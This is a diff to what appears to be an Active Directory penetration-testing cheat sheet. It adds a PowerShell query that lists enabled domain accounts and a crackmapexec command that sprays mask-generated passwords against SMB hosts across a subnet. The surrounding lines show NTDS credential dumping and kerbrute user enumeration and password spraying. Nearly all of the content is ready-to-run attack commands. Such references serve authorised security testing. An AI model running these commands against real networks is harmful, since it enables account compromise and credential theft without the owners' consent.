@@ -307,6 +307,8 @@ cme smb 10.10.0.202 -u username -p password --ntds vss
 enum4linux | grep -i desc
 There are 3-4 fields that seem to be common in most AD schemas: 
 UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
+
+Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
 ```
 
 ### PassTheTicket Golden Tickets
@@ -563,11 +565,19 @@ Alternatively you can use the Metasploit module
 
 ### Password spraying
 
-Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
+
+Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 ```powershell
 root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
+```
+
+Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
+
+```powershell
+crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
 Most of the time the best passwords to spray are :
